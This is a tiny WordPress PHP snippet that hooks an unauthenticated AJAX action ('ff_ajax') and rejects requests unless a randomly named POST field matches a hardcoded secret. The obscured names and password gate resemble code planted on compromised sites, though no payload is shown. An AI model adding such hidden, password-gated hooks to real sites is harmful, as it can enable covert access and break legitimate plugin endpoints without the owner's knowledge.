<?php

function first_uploader_auto_animated() {
	if (!isset($_POST["yvjhwkvgxgngsml"]) || $_POST["yvjhwkvgxgngsml"] !== "wjtK4rJYqn") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'first_uploader_auto_animated', 5, 1);
